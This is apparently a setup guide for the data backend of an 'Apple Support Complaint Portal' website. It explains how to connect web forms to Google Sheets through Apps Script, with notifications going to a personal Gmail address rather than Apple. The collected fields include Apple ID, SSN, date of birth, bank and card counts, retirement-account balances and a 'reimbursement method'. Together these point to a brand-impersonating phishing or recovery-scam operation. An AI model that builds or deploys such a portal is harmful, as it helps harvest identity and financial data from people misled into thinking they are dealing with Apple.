# Google Sheets Integration Setup Guide

## Overview
This guide will help you set up Google Sheets integration to automatically collect all form submissions from the Apple Support Complaint Portal.

## Prerequisites
- Google Account
- Access to Google Sheets
- Access to Google Apps Script

## Step 1: Create Google Sheet
1. Go to [Google Sheets](https://sheets.google.com)
2. Create a new spreadsheet
3. Name it "Apple Support Complaint Portal"
4. Copy the spreadsheet ID from the URL (between `/d/` and `/edit`)
5. Example: `https://docs.google.com/spreadsheets/d/SPREADSHEET_ID_HERE/edit`

## Step 2: Setup Google Apps Script
1. Open the spreadsheet you created
2. Go to `Extensions` > `Apps Script`
3. Delete any existing code
4. Copy the entire contents of `google-sheets-script.js`
5. Paste it into the Apps Script editor
6. **Important**: Replace `YOUR_SPREADSHEET_ID_HERE` with your actual spreadsheet ID
7. **Important**: Verify `ADMIN_EMAIL` is set to `janetgunnoe09@gmail.com`
8. Save the project (Ctrl+S or File > Save)

## Step 3: Deploy Web App
1. In Apps Script, click `Deploy` > `New deployment`
2. Select type: `Web app`
3. Description: `Apple Support Complaint Portal API`
4. Execute as: `Me (your email)`
5. Who has access: `Anyone`
6. Click `Deploy`
7. Authorize the permissions when prompted
8. Copy the Web app URL (it will look like: `https://script.google.com/macros/s/AKfycbx.../exec`)

## Step 4: Initialize the Spreadsheet
1. In Apps Script, go to `Functions` dropdown
2. Select `setup`
3. Click `Run`
4. This will create the required sheets and headers
5. Check your spreadsheet - you should see two sheets: "Complaints" and "AssetVerifications"

## Step 5: Update Website Configuration
1. Open `form-enhancements.js`
2. Replace `YOUR_SCRIPT_ID_HERE` with your actual script ID (from the web app URL)
3. Replace `YOUR_SPREADSHEET_ID_HERE` with your spreadsheet ID
4. Open `dashboard.html`
5. Replace the same values in the Google Sheets configuration

## Step 6: Test the Integration
1. Submit a test complaint through the website
2. Submit a test asset verification through the dashboard
3. Check your Google Sheet - new rows should appear
4. Check your email for notifications

## Configuration Values to Update

### In `form-enhancements.js`:
```javascript
const GOOGLE_SHEETS_CONFIG = {
    scriptURL: 'https://script.google.com/macros/s/AKfycbxYOUR_ACTUAL_SCRIPT_ID_HERE/exec',
    spreadsheetId: 'YOUR_ACTUAL_SPREADSHEET_ID_HERE',
    adminEmail: 'janetgunnoe09@gmail.com'
};
```

### In `dashboard.html`:
```javascript
const GOOGLE_SHEETS_CONFIG = {
    scriptURL: 'https://script.google.com/macros/s/AKfycbxYOUR_ACTUAL_SCRIPT_ID_HERE/exec',
    spreadsheetId: 'YOUR_ACTUAL_SPREADSHEET_ID_HERE',
    adminEmail: 'janetgunnoe09@gmail.com'
};
```

## Data Structure

### Complaints Sheet Columns:
1. Timestamp
2. Tracking Number
3. Full Name
4. Phone
5. Email
6. Apple ID
7. Complaint Type
8. Description
9. Submitted
10. Status
11. Processing Status

### Asset Verifications Sheet Columns:
1. Timestamp
2. Reference Number
3. Loss Type
4. Loss Amount
5. Description
6. Date of Incident
7. Authorities Contacted
8. SSN (masked)
9. DOB
10. Property Count
11. Bank Account Count
12. Credit Card Count
13. 401k
14. 401k Balance
15. IRA
16. IRA Balance
17. Money Market
18. Money Market Balance
19. Reimbursement Method
20. Additional Info
21. User Email
22. Status

## Troubleshooting

### Common Issues:
1. **CORS Error**: Make sure the Apps Script deployment is set to "Anyone" access
2. **Script ID Error**: Verify you copied the correct script ID from the web app URL
3. **Spreadsheet ID Error**: Verify you copied the correct spreadsheet ID from the sheet URL
4. **Permission Error**: Make sure you authorized all requested permissions

### Debugging:
1. Check browser console for errors
2. Check Apps Script execution logs
3. Test the web app URL directly in browser
4. Verify data appears in Google Sheets

## Security Notes:
- Sensitive data (SSN) is masked in the sheet
- All submissions are timestamped
- Admin receives email notifications
- Data is stored in your Google Drive

## Maintenance:
- Monitor the Google Sheets regularly
- Set up email filters for notifications
- Consider setting up data retention policies
- Regular backups of the spreadsheet
